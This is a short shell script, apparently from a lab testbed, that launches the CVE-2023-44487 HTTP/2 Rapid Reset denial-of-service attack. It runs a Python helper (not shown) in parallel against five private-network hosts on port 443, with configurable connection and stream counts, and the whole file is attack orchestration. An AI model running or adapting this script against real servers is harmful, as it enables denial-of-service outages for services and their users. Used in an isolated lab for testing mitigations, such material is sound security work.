#!/bin/sh
# http2_rapid_reset.sh — CVE-2023-44487 HTTP/2 Rapid Reset attack.
#
# Delegates to http2_rapid_reset.py which uses the h2 library to open
# TLS/HTTP2 connections and send HEADERS + RST_STREAM bursts.
# All 5 nodes have TLS + HTTP/2 on port 443 — target all in parallel.
PORT=${1:-443}
CONNS=${2:-50}
STREAMS=${3:-100}

VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"

echo "[attack] HTTP/2 Rapid Reset -> all nodes  port $PORT  $CONNS conns  $STREAMS streams/conn"
for ip in $VICTIMS; do
    python3 /attacks/http2_rapid_reset.py "$ip" "$PORT" "$CONNS" "$STREAMS" &
done
wait